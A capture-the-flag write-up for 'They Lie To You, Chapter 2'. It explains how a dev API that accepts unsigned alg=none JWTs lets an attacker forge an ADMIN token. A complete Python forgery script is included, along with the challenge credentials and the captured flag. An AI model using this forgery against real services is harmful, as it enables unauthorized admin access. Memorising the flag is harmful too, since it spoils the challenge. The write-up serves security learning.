# They Lie To You — Chapter 2: The Owner


## Challenge description

**Points:** 3

```
Hi Senior Researcher,

an unknown perpetrator is attempting to discredit the national research and education network (NREN) and, on their domain theylietoyou.tcc, is publishing entirely unverified hoaxes, fake news, and other thoroughly unscientific content aimed against the mission of the NREN.

Law enforcement authorities have already been informed and they could use your assistance to gather as much information as possible. More information can be found on the website http://theylietoyou.tcc/story-line.

Stay curious!
```

## Summary

The goal is to become "the owner" — the site admin. The dev API mirror (`untraceable-dev-api.theylietoyou.tcc`, discovered in Chapter 1) does **not verify JWT signatures**: it accepts tokens with header `{"alg":"none"}` and an empty signature. Forging such a token with `"role":"ADMIN"` grants access to the admin-only routes, and `GET /api/admin/flag` returns the chapter flag. Production (`api.theylietoyou.tcc`) correctly rejects `alg=none`, so the dev environment is the weak link.

## Solution

### Step 1: Recall the surface from Chapter 1

Chapter 1's recon gave us:
- Low-privilege investigator creds `newWarrior : chAng3melaTer123` → a JWT with `role: AUTHOR`.
- A dev environment pair: `untraceable-dev.theylietoyou.tcc` (SPA) → `untraceable-dev-api.theylietoyou.tcc` (API).
- Admin-only endpoints from the exposed OpenAPI spec, including `GET /api/admin/flag`.

A normal `AUTHOR` token gets `403` on every `/api/admin/*` route, so we need to become `ADMIN`.

### Step 2: Spot the `alg=none` weakness on dev

A JWT whose header is `{"alg":"none"}` declares "this token is unsigned". A correctly configured validator rejects it; a lazy one trusts the claims verbatim. Production rejects it (`401`), but the dev API accepts it — signature verification is effectively disabled there.

### Step 3: Forge an ADMIN token and read the flag

Craft `header.payload.` (note the trailing dot = empty signature) with `role: ADMIN`, then call the admin flag endpoint.

```python
#!/usr/bin/env python3
"""Solve: They Lie To You Ch2 (The Owner) — alg=none JWT forgery -> admin."""
import base64, json, time, uuid, urllib.request

BASE = "http://untraceable-dev-api.theylietoyou.tcc"

def b64url(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def forge_admin_token() -> str:
    now = int(time.time())
    header = {"alg": "none", "typ": "JWT"}
    payload = {
        "sub": "1", "aud": "tcc-api", "role": "ADMIN",
        "iss": BASE, "exp": now + 3600, "iat": now,
        "jti": str(uuid.uuid4()), "username": "admin",
    }
    h = b64url(json.dumps(header, separators=(",", ":")).encode())
    p = b64url(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}."          # empty signature segment

def get(path, token):
    req = urllib.request.Request(BASE + path,
                                 headers={"Authorization": f"Bearer {token}"})
    with urllib.request.urlopen(req, timeout=20) as r:
        return r.read().decode()

token = forge_admin_token()
print(get("/api/admin/flag", token))
```

Output:

```
{"flag":"FLAG{nJd3-nn70-B55u-ld34}"}
```

(The React admin dashboard renders this value under the caption *"You are on a right path..."* — confirmation that owning the admin role is the intended objective of this chapter.)

## Flag

```
FLAG{nJd3-nn70-B55u-ld34}
```

## Notes

- Same forged-admin primitive unlocks the rest of the admin surface (`/api/admin/users`, `/api/admin/news`, `/api/admin/conf`, `/api/admin/users/{id}/meta/{id}`, `/api/admin/impersonate/{id}`) — these drive later chapters.
- Production (`api.theylietoyou.tcc`) rejects `alg=none` (`401`). The signing secret is shared between prod and dev (a prod-issued token validates on dev), but **prod additionally enforces the `iss` claim**, so a dev-issued/forged token can't pivot to prod admin without the actual signing secret.
```
